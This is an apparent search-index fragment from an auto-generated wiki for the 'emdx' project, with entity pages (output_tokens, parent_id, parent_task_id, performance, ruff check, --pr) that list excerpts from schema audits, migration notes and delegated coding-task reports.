<p>#6466 Fix: Execution Dataclass Schema-Model Mismatch in EMDX   Section: Missing Fields Identified</p> </li> <li><code>task_id</code> - Links executions back to the creating task</li> <li><code>cost_usd</code> - Tracks API costs in USD</li> <li><code>tokens_used</code> - Total token usage count</li> <li><code>input_tokens</code> - Input token count</li> <li> <p><code>output_tokens</code> - Output token count</p> </li> <li> <p>#6372 Codebase Bug Audit 2026-02-15 [4/10]   Section: Summary</p> <p>...cution<code>dataclass includes fields like</code>cost_usd<code>,</code>tokens_used<code>,</code>input_tokens<code>,</code>output_tokens<code>,</code>cascade_run_id<code>, and</code>task_id<code>, but</code>get_execution()<code>,</code>get_recent_executions()<code>,</code>get_running_executions()<code>, and</code>get_stale_executions()` do not SELECT or popula...</p> </li> <li> <p>#6277 Delegate: DEBT-2: Fix schema-model mismatch. The Execution dataclass i   Section: DEBT-2: Fix schema-model mismatch in Execution dataclass</p> <ol> <li>Migration 036 columns:</li> </ol> </li> <li><code>task_id</code> - Links execution to tasks</li> <li><code>cost_usd</code> - API cost tracking</li> <li><code>tokens_used</code> - Total token usage</li> <li><code>input_tokens</code> - Input token tracking</li> <li> <p><code>output_tokens</code> - Output token tracking</p> </li> <li> <p>#6268 Delegate: Document #6230 (Migration/Schema Debt Implementation)   Section: 1. Fixed Execution Dataclass (MEDIUM severity)</p> <p>...laude API</p> </li> <li><code>tokens_used</code>: Total tokens consumed</li> <li><code>input_tokens</code>: Input tokens</li> <li> <p><code>output_tokens</code>: Output tokens</p> </li> <li> <p>#6249 Migration/Schema Debt Fix Implementation [6/14]   Section: Changes Made</p> <p>...run_id` (migration 031)</p> </li> <li><code>task_id</code>, <code>cost_usd</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code> (migration 036)</li> <li><code>last_heartbeat</code> (migration 037)</li> <li>Refactored all SELECT queries to use shared <code>_EXECUTION_COLUMNS</code> constant</li> <li> <p>Added <code>_row_to_execution()</code> helpe...</p> </li> <li> <p>#6237 Delegate synthesis [synthesis]   Section: Critical Findings (Immediate Action Required)</p> <p>...031/036: <code>cascade_run_id</code>, <code>task_id</code>, <code>cost_usd</code>, <code>tokens_used</code>, <code>input_tokens</code>, <code>output_tokens</code></p> </li> <li> <p><code>last_heartbeat</code> column queries exist but column was dropped in migration 013</p> </li> <li> <p>#6228 Delegate: Audit MIGRATION/SCHEMA DEBT in the emdx project: Check datab [6/14]   Section: 1. MEDIUM: Execution Dataclass Out of Sync with Schema**</p> <p>...s_used<code>| 036 | Total tokens consumed | |</code>input_tokens<code>| 036 | Input tokens | |</code>output_tokens` | 036 | Output tokens |</p> </li> </ul>"},{"location":"entities/outputtokens/#from-migration-036","title":"From Migration 036","text":""},{"location":"entities/outputtokens/#related-entities","title":"Related Entities","text":"<ul> <li><code>input_tokens</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (13 shared docs, PMI=6.0)</li> <li><code>execution_time_ms</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.0)</li> <li><code>unified executor</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.0)</li> <li><code>`emdx/services/types.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.0)</li> <li><code>.types</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.0)</li> <li><code>execution.is_zombie</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>task_id: optional[int] = none</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>task redo</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>schema debt fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>tokens_used</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (13 shared docs, PMI=5.8)</li> </ul>"},{"location":"entities/parentid/","title":"parent_id","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-01-05</p>"},{"location":"entities/parentid/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6713 wiki-schema-research   Section: Current Schema Inventory (Relevant Tables)</p> <p>...-|-------------| | <code>documents</code> | Core content store | id, title, content, project, parent_id, relationship, stage | | <code>documents_fts</code> | FTS5 full-text search | title, content, project | | <code>document_links</code> | Knowledge graph edges | source_doc_id, target_doc_i...</p> </li> <li> <p>#6477 EMDX Task System: Unified Architecture and Simplification Strategy   Section: 1. Core Overlap: Tasks vs Tagged Documents**</p> <p>...tive, \u2705done, \ud83d\udea7blocked, \u274cfailed | | Planning context | <code>gameplan_id</code> \u2192 documents | <code>parent_id</code> + \ud83c\udfafgameplan tag | | Work items | Separate <code>tasks</code> table | Documents with \"task\" tag | | Progress logging | <code>task_log</code> table | Child documents with `relationship='lo...</p> </li> <li> <p>#6410 Delegate: Research and design structured metadata for emdx save and de [2/2]   Section: Current State Analysis</p> <p>...<code>access_count</code> (timestamps/tracking)</p> </li> <li><code>is_deleted</code>, <code>deleted_at</code> (soft delete)</li> <li><code>parent_id</code>, <code>relationship</code> (document hierarchy - supersedes/exploration/variant)</li> <li> <p><code>archived_at</code> (archive status)</p> </li> <li> <p>#6376 Codebase Bug Audit 2026-02-15 [1/10]   Section: MEDIUM Issues</p> </li> </ul> <pre><code>elif parent_id &gt; 0:\n    conditions.append(\"parent_id = ?\")\n</code></pre> <p>Bug:...</p> <ul> <li>#6314 Delegate: analysis,architecture,active [13/15]   Section: Core Architecture Layers <p>Key Tables:</p> </li> <li><code>documents</code> - content, metadata, project association, parent_id for lineage</li> <li><code>tags</code> / <code>document_tags</code> - emoji tags with aliases</li> <li><code>executions</code> - execution tracking with PID, log file, status</li> <li> <p><code>documents_fts</code> - FTS5 virtual tabl...</p> </li> <li> <p>#6228 Delegate: Audit MIGRATION/SCHEMA DEBT in the emdx project: Check datab [6/14]   Section: 3. LOW: Orphaned FTS Triggers on FTS5 Update**</p> <p>This doesn't include <code>stage</code>, <code>pr_url</code>, <code>relationship</code>, <code>archived_at</code>, or <code>parent_id</code>. This is expected (FTS is for search) but means text searches can't filter by these fields efficiently.</p> </li> <li> <p>#6154 Delegate: analysis [3/3]   Section: Database Schema Highlights</p> </li> <li><code>id</code>, <code>title</code>, <code>content</code>, <code>project</code></li> <li><code>parent_id</code>, <code>relationship</code> (for hierarchy)</li> <li><code>stage</code>, <code>pr_url</code> (cascade metadata)</li> <li><code>is_deleted</code>, <code>deleted_at</code> (soft delete)</li> <li> <p><code>access_count</code>, <code>accessed_at</code> (usage tracking)</p> </li> <li> <p>#1835 Architecture Analysis: EMDX Control Center v5 Implementation   Section: Current Architecture Strengths</p> <p>...y to extend</p> </li> <li>Document model: Already supports hierarchical relationships via <code>parent_id</code></li> <li>Tag system: Flexible many-to-many with emoji aliases</li> <li>Execution tracking: Complete table with status, timestamps, exit codes, PID</li> <li>Agent system: Mig...</li> </ul>"},{"location":"entities/parentid/#9-potential-integer-overflow-in-parent_id-filter-documentspy132-135","title":"9. Potential Integer Overflow in parent_id Filter (documents.py:132-135)","text":"<p>Severity: MEDIUM File: documents.py:130-135</p>"},{"location":"entities/parentid/#documents-table","title":"Documents Table","text":""},{"location":"entities/parentid/#related-entities","title":"Related Entities","text":"<ul> <li><code>create index if not exists</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>archived_at</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>relationship</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.4)</li> <li><code>documents_fts</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>deleted_at</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>missing index</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>access_count</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>safe mode</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>emdx_safe_mode=1</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>current state analysis</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> </ul>"},{"location":"entities/parenttaskid/","title":"parent_task_id","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-02-13</p>"},{"location":"entities/parenttaskid/#documents-11","title":"Documents (11)","text":"<ul> <li>#6811 Delegate: Fix DOC-7: Update docs/cli-api.md to add the --json flag to  [2/5]   Section: Summary <p>...rallel task JSON output structure showing fields from <code>ParallelResult.to_dict()</code>: <code>parent_task_id</code>, <code>task_count</code>, <code>succeeded</code>, <code>failed</code>, <code>doc_ids</code>, <code>tasks</code> array, <code>total_duration_seconds</code>, <code>total_duration</code></p> </li> <li> <p>Note about <code>synthesis</code> object when <code>--synthesize</code> is...</p> </li> <li> <p>#6502 None Type Analysis [1/7]   Section: emdx/commands/delegate.py</p> <p>...lse,     working_dir: str | None = None,     source_doc_id: int | None = None,     parent_task_id: int | None = None,     seq: int | None = None,     epic_key: str | None = None, ) -&gt; SingleResult: ``` Verdict: ALL NECESSARY</p> </li> <li> <p><code>title</code>: `title or f\"Delegate: {...</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Tasks Table (Core Entity)</p> <p>...ments (output) | | <code>source_doc_id</code> | INTEGER | NULL | FK to documents (input) | | <code>parent_task_id</code> | INTEGER | NULL | FK to tasks (hierarchy) | | <code>seq</code> | INTEGER | NULL | Sequence in parent group | | <code>retry_of</code> | INTEGER | NULL | FK to tasks (retry chain) | | `er...</p> </li> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: delegate.py - Execution Creation Flow</p> <p>..._type=\"single\",        status=\"active\",        source_doc_id=source_doc_id,        parent_task_id=parent_task_id,        seq=seq,        tags=\",\".join(tags) if tags else None,    )    ```</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Database Schema</p> <p>...ions table</p> </li> <li><code>output_doc_id</code>: Result document</li> <li><code>source_doc_id</code>: Input document</li> <li><code>parent_task_id</code>: Hierarchical parent</li> <li><code>seq</code>: Sequence number in parent</li> <li><code>retry_of</code>: Previous attempt</li> <li><code>tags</code>: Comma-separated tags</li> <li> <p><code>error</code>: Error message</p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Core Components</p> <p>...ls/tasks.py`)**</p> </li> <li>Primary entity for tracking work items</li> <li>Supports hierarchy via <code>parent_task_id</code> for grouped operations</li> <li>Status workflow: <code>open</code> \u2192 <code>active</code> \u2192 <code>done</code> | <code>failed</code> | <code>blocked</code></li> <li>Priority levels 1-5 with gameplan linkage</li> <li> <p>Fields for delegate activi...</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: 3. Tasks Table (<code>models/tasks.py</code>)</p> <p>...t created | | <code>source_doc_id</code> | INTEGER FK | Input document used (--doc flag) | | <code>parent_task_id</code> | INTEGER FK | For group/chain hierarchies | | <code>seq</code> | INTEGER | Order in parent group | | <code>retry_of</code> | INTEGER FK | For retry tracking | | <code>error</code> | TEXT | Error m...</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Delegate Activity Tracking Fields (added in migration 034)</p> <p>...c) | | <code>source_doc_id</code> | INTEGER | NULL | FK to documents (input context doc) | | <code>parent_task_id</code> | INTEGER | NULL | FK to tasks (for child tasks in parallel/chain) | | <code>seq</code> | INTEGER | NULL | Sequence number for ordering children | | <code>retry_of</code> | INTEGER | NUL...</p> </li> <li> <p>#6161 Delegate: Analyze task usage in prime and status commands. Read emdx/c [7/15]   Section: <code>emdx status</code> \u2014 Delegate Activity Index</p> <p>...ate_tasks()` from models/tasks.py</p> </li> <li>Query: Tasks where <code>status = 'active'</code> AND <code>parent_task_id IS NULL</code> (top-level only)</li> <li>Shows child task progress for group/chain tasks</li> <li> <p>Fields: <code>id</code>, <code>type</code> (single/group/chain), <code>title</code>, duration, child progress</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Task Creation in Delegate</p> </li> <li>Creates task BEFORE execution (lines 200-209):</li> <li><code>task_type=\"single\"</code>, <code>status=\"active\"</code></li> <li>Stores <code>source_doc_id</code>, <code>parent_task_id</code>, <code>seq</code>, <code>tags</code>, <code>prompt</code></li> </ul>"},{"location":"entities/parenttaskid/#single-task-_run_single","title":"Single Task (<code>_run_single</code>)","text":""},{"location":"entities/parenttaskid/#related-entities","title":"Related Entities","text":"<ul> <li><code>retry_of</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=6.3)</li> <li><code>execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.3)</li> <li><code>dependency system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.3)</li> <li><code>chain tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.3)</li> <li><code>task_deps table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>task lifecycle</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>single tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>parallel tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>tasks table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.0)</li> <li><code>depends_on</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/performance/","title":"performance","text":"<p>Type: heading | Mentioned in: 10 documents | First seen: 2025-07-07</p>"},{"location":"entities/performance/#documents-10","title":"Documents (10)","text":"<ul> <li>#6534 EMDX Future Directions: Agent-First Design [2/4] <p>Agent Communication Panel</p> </li> </ul> <p>Concept: If using multi-agent workflows (like <code>emdx delegate</code> with <code>--synthesize</code>), show inter-agent messages and coordination. Implementation ideas: - Chat-like view of agent messages/handoffs - Show which agent is...</p> <ul> <li>#185 MCP-SETUP-GUIDE   Section: PostgreSQL MCP Pro Setup </li> <li>\u2705 Full read/write access (INSERT, UPDATE, DELETE, CREATE, DROP)</li> <li>\u2705 Performance analysis and optimization</li> <li>\u2705 Index recommendations</li> <li>\u2705 Database health monitoring</li> <li> <p>\u2705 Query execution planning</p> </li> <li> <p>#6478 PROZE: AI-Powered Prose Diff Tool   Section: Architecture: Three-Tier Design</p> <p>...+ patience diff</p> </li> <li>Word-level diff within modified blocks with semantic cleanup</li> <li>Performance: &lt;10ms for typical README, &lt;100ms for book chapters</li> <li> <p>Works offline, zero external dependencies</p> </li> <li> <p>#4848 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: 2. Batch Query Patterns Eliminate N+1 Problems**</p> <p>Every analysis emphasized the performance impact of batch loading:</p> </li> <li> <p>#247 Clauding Implementation Plan - Critical Issues Resolution   Section: Clauding Implementation Plan - Critical Issues Resolution</p> <p>...severity: security vulnerabilities first, then critical functionality, followed by performance and feature enhancements.</p> </li> <li> <p>#162 Claude Stored Procedures POC   Section: Benefits of This Approach</p> <p>...procedures independently</p> </li> <li>Backup Simplicity - Logic backed up with data</li> <li>Performance - Reduced network roundtrips</li> <li> <p>Security - Can use row-level security and SECURITY DEFINER</p> </li> <li> <p>#150 Claude Command Structure Analysis   Section: Implementation Priority</p> <ol> <li>Low Priority</li> </ol> </li> <li>Add advanced features (tags, versioning)</li> <li>Optimize performance further</li> <li> <p>Add export formats</p> </li> <li> <p>#13 Simplified Document Version Tracking Plan   Section: Implementation Benefits</p> <ol> <li>Simplicity: Minimal code, easy to understand and debug</li> </ol> </li> <li>Reliability: Fewer moving parts, less chance of corruption</li> <li>Performance: Simple queries, minimal overhead</li> <li> <p>Maintainability: No complex storage optimization logic</p> </li> <li> <p>#18 Clauding Project Gameplan - Updated   Section: \u2705 What's Working Well</p> <ol> <li>Performance</li> </ol> </li> <li>Handles 2000+ documents with millisecond responses</li> <li>GIN indexes for instant search</li> <li>Optimized recent documents queries</li> </ul>"},{"location":"entities/performance/#what-is-mcp-pro","title":"What is MCP Pro?","text":"<p>Enhanced PostgreSQL server with:</p>"},{"location":"entities/performance/#related-entities","title":"Related Entities","text":"<ul> <li><code>usability</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.4)</li> <li><code>\ud83d\udd04 known issues</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>\u2705 what's working well</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>standard fish plugin structure</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>speed</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>short-term goals (2 weeks)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>shell support</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>search enhancements</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>rich content support</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> <li><code>recent additions</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.4)</li> </ul>"},{"location":"entities/poetry-run-ruff-check/","title":"poetry run ruff check .","text":"<p>Type: tech_term | Mentioned in: 13 documents | First seen: 2026-02-14</p>"},{"location":"entities/poetry-run-ruff-check/#documents-13","title":"Documents (13)","text":"<ul> <li>#6608 Delegate: Remove the --each/--do dynamic discovery feature from emdx d   Section: Verification <ul> <li><code>poetry run ruff check .</code> \u2014 All checks passed</li> </ul> </li> <li><code>poetry run pytest tests/ -x -q</code> \u2014 1174 passed, 9 skipped (1 pre-existing failure in <code>test_commands_core.py</code> unrelated to this change)</li> <li>All 83 delegate tests pass</li> <li> <p>All 35 prime tests pass</p> </li> <li> <p>#6606 Delegate: Update CLAUDE.md to reflect that 'emdx epic' and 'emdx cat'    Section: Verification</p> <ul> <li><code>poetry run ruff check .</code> \u2014 All checks passed</li> </ul> </li> <li>No code changes were made</li> <li> <p>No PR needed</p> </li> <li> <p>#6549 Delegate: Review PR #654 using 'gh pr view 654' and 'gh pr diff 654'.  [2/6]   Section: Quality Checks</p> <ul> <li>\u2705 <code>poetry run ruff check .</code> - All checks passed</li> </ul> </li> <li> <p>\u2705 <code>poetry run pytest tests/test_recipe_*.py tests/test_commands_recipe.py</code> - 55 tests passed</p> </li> <li> <p>#6540 Delegate: Fix issues found in PR #652 review (doc #6529 in emdx KB). T [3/3]   Section: Testing</p> <ul> <li><code>poetry run ruff check .</code> - All checks passed</li> </ul> </li> <li> <p><code>poetry run pytest tests/test_recipe_executor.py tests/test_recipe_parser.py tests/test_commands_recipe.py -x -q</code> - 55 tests passed</p> </li> <li> <p>#6443 Delegate: Fix orphan worktrees when using --pr flag   Section: Changes Made</p> </li> <li><code>poetry run ruff check .</code> - All checks passed</li> <li> <p><code>poetry run pytest tests/test_delegate_commands.py -x -q</code> - 76 tests passed</p> </li> <li> <p>#6440 Remove unused kwargs and tighten SQL param types   Section: Verification</p> <ul> <li><code>poetry run mypy emdx/ --no-error-summary</code> \u2014 \u2705 passes</li> </ul> </li> <li><code>poetry run ruff check .</code> \u2014 \u2705 passes  </li> <li> <p><code>poetry run pytest tests/ -x -q</code> \u2014 \u2705 1103 passed, 8 skipped</p> </li> <li> <p>#6425 Delegate: Task #594: Add --draft flag to emdx delegate --pr   Section: Testing</p> <ul> <li><code>poetry run ruff check .</code> - passes</li> </ul> </li> <li> <p><code>poetry run pytest tests/test_delegate_commands.py -x -q</code> - 71 tests pass</p> </li> <li> <p>#6413 Delegate: Implement 'emdx review' CLI commands for triaging agent-prod   Section: Files Changed</p> </li> <li>All commands verified working with help output</li> <li><code>emdx review stats</code> and <code>emdx review list</code> tested successfully</li> <li> <p><code>poetry run ruff check .</code> passes with zero errors</p> </li> <li> <p>#6364 Delegate: Fix all auto-fixable ruff lint errors on the emdx codebase.   Section: Work Completed</p> </li> <li><code>poetry run ruff check .</code> - All checks passed</li> <li> <p><code>poetry run pytest tests/ -x -q</code> - 991 passed, 8 skipped</p> </li> <li> <p>#6273 Delegate: DEBT-4: Expand CI. In .github/workflows/test.yml: expand Pyt   Section: Changes Made</p> <ol> <li>Added Ruff Linting Job</li> </ol> </li> <li>New <code>lint</code> job that runs <code>poetry run ruff check .</code></li> <li> <p>Runs once on Python 3.13 (not per Python version for efficiency)</p> </li> <li> <p>#6225 Delegate: Audit BUILD/CI DEBT in the emdx project: Check GitHub Action [7/14]   Section: Recommended Actions (Priority Order)</p> <p>...Expand Python matrix** to [\"3.11\", \"3.12\", \"3.13\"]</p> </li> <li>Add linting step in CI: <code>poetry run ruff check .</code></li> <li>Add type checking step in CI: <code>poetry run mypy emdx</code></li> <li>Add security scanning: bandit + pip-audit workflow</li> <li> <p>Add dependabot.yml for automated depend...</p> </li> <li> <p>#6215 Delegate: Audit BUILD/CI DEBT in the emdx project: Check GitHub Action [7/14]   Section: Quick Wins Checklist</p> <ul> <li>[ ] Add Python 3.11, 3.12 to test matrix</li> </ul> </li> <li>[ ] Add <code>poetry run ruff check .</code> step to CI</li> <li>[ ] Add <code>poetry run mypy emdx</code> step to CI</li> <li>[ ] Create <code>.github/dependabot.yml</code> for dependency updates</li> <li>[ ] Update GitHub Actions to latest versions -...</li> </ul>"},{"location":"entities/poetry-run-ruff-check/#verification","title":"Verification","text":""},{"location":"entities/poetry-run-ruff-check/#testing","title":"Testing","text":""},{"location":"entities/poetry-run-ruff-check/#verification_1","title":"Verification","text":""},{"location":"entities/poetry-run-ruff-check/#related-entities","title":"Related Entities","text":"<ul> <li><code>poetry run mypy emdx</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>codecov/codecov-action@v3</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>actions/setup-python@v4</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>actions/cache@v3</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.0)</li> <li><code>tests/test_file_watcher.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>review issues</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>recipe_parser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>raise typer.exit(1) from e</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>fail_ci_if_error: false</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>draft=false</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/pr/","title":"--pr","text":"<p>Type: tech_term | Mentioned in: 21 documents | First seen: 2026-02-13</p>"},{"location":"entities/pr/#documents-21","title":"Documents (21)","text":"<ul> <li> <p>#6852 FIX-6: Delegate --pr Permission Failures Analysis   Section: Summary</p> <p>The <code>delegate --pr</code> flag intermittently fails with permission errors when agents try to <code>git push</code> or <code>gh pr create</code>. PR #777 (subcommand routing fix) did NOT resolve this \u2014 failures continued after its merge.</p> </li> <li> <p>#6825 Delegate: --help [2/2]   Section: Options</p> <p>...on stdout) | | <code>--doc</code> | <code>-d</code> | INTEGER | Document ID to use as input context | | <code>--pr</code> | \u2014 | \u2014 | Instruct agent to create a PR (implies <code>--worktree</code>) | | <code>--branch</code> | \u2014 | \u2014 | Commit and push to origin branch (implies <code>--worktree</code>, no PR) | | <code>--draft</code>...</p> </li> <li> <p>#6789 Delegate: --help [2/2]</p> <p>...so they render nicely in <code>--help</code></p> </li> <li>Grouped option panels \u2014 Git/PR options (<code>--pr</code>, <code>--branch</code>, <code>--draft</code>, <code>--worktree</code>, <code>--base-branch</code>) are grouped under \"Git &amp; PRs\", and <code>--epic</code>/<code>--cat</code> under \"Organization\"</li> <li> <p>Concise option descriptions \u2014...</p> </li> <li> <p>#6788 Delegate: --help [2/2]</p> <p>...markup_mode=\"rich\"` 